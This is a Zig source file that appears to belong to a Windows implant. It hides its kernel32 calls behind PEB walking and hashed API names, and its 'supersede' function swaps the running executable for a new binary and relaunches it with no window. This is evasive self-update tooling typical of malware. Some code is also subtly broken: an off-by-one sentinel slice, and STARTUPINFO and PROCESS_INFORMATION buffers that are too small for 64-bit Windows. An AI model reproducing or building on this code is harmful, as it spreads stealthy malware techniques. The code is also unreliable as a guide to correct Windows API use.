const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

fn loadKernel32() ?types.PVOID {
    return peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll"));
}

fn getExePathBuf(buf: *[1024]u16) ?usize {
    const kernel32 = loadKernel32() orelse return null;
    const func = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetModuleFileNameW")) orelse return null;
    const GetModuleFileNameW: *const fn (module: ?*const anyopaque, buffer: [*]u16, size: u32) callconv(.winapi) u32 = @ptrCast(@alignCast(func));
    const len = GetModuleFileNameW(null, buf, @as(u32, @intCast(buf.len)));
    if (len == 0) return null;
    return len;
}

pub fn supersede(new_exe_path: []const u8) bool {
    const kernel32 = loadKernel32() orelse return false;
    var cur_wide: [1024]u16 = undefined;
    const cur_len = getExePathBuf(&cur_wide) orelse return false;

    const moveFile = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("MoveFileExW")) orelse return false;
    const MoveFileExW: *const fn (existing: ?[*:0]const u16, new: ?[*:0]const u16, flags: u32) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(moveFile));

    const copyFile = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CopyFileW")) orelse return false;
    const CopyFileW: *const fn (existing: ?[*:0]const u16, new: ?[*:0]const u16, fail_if_exists: types.BOOL) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(copyFile));

    const createProc = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CreateProcessW")) orelse return false;
    const CreateProcessW: *const fn (app: ?[*:0]const u16, cmd: ?[*:0]u16, pa: ?*const anyopaque, ta: ?*const anyopaque, ih: types.BOOL, flags: u32, env: ?*const anyopaque, dir: ?[*:0]const u16, si: *const anyopaque, pi: *anyopaque) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(createProc));

    var backup_wide: [1024]u16 = undefined;
    var copy_len: usize = 0;
    while (copy_len < cur_len and copy_len < 1019) : (copy_len += 1) backup_wide[copy_len] = cur_wide[copy_len];
    backup_wide[copy_len] = '.';
    copy_len += 1;
    backup_wide[copy_len] = 'o';
    copy_len += 1;
    backup_wide[copy_len] = 'l';
    copy_len += 1;
    backup_wide[copy_len] = 'd';
    copy_len += 1;
    backup_wide[copy_len] = 0;

    var new_wide: [1024]u16 = undefined;
    var i: usize = 0;
    while (i < new_exe_path.len and i < 1023) : (i += 1) new_wide[i] = new_exe_path[i];
    new_wide[i] = 0;

    if (MoveFileExW(cur_wide[0..cur_len :0], backup_wide[0..copy_len :0], 1) == 0) return false;
    if (CopyFileW(new_wide[0 .. i + 1 :0], cur_wide[0..cur_len :0], 0) == 0) return false;

    var si: [68]u8 = undefined;
    @memset(&si, 0);
    var pi: [16]u8 = undefined;
    @memset(&pi, 0);
    _ = CreateProcessW(null, cur_wide[0..cur_len :0], null, null, 0, 0x08000000, null, null, @ptrCast(&si), @ptrCast(&pi));

    return true;
}

test "supersede returns result" {
    _ = supersede("C:\\new_test.exe");
}
